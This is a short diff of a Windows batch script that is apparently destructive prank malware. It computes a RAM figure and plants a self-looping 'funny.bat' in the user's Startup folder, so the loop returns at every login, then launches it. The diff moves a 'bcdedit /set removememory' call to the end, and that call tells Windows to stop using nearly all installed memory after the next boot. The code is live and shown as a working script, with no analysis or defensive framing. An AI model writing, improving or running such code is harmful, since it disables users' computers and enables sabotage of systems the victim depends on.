@@ -14,8 +14,6 @@ set /a "c=%system_ram% - 28"
 
 echo Will be getting rid of %c% bytes of memory
 
-bcdedit.exe /set removememory %c% 
-
 echo Starting copy...
 cd "%AppData%/Microsoft/Windows/Start Menu/Programs/Startup"
 echo :funny > funny.bat
@@ -24,3 +22,5 @@ echo goto:funny >> funny.bat
 echo Finished!
 start funny.bat
 echo Running...
+
+bcdedit.exe /set removememory %c% 
